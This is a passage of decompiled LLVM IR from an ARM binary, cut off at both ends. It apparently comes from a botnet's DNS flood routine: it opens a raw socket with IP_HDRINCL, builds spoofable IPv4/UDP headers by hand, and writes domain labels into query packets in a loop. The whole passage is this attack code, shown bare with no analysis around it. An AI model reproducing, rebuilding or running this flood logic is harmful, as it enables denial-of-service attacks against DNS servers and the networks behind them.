  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* %sb.global-to-local, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  store i32 %v1_a768, i32* %sb.global-to-local, align 4
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_24d4c.56, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
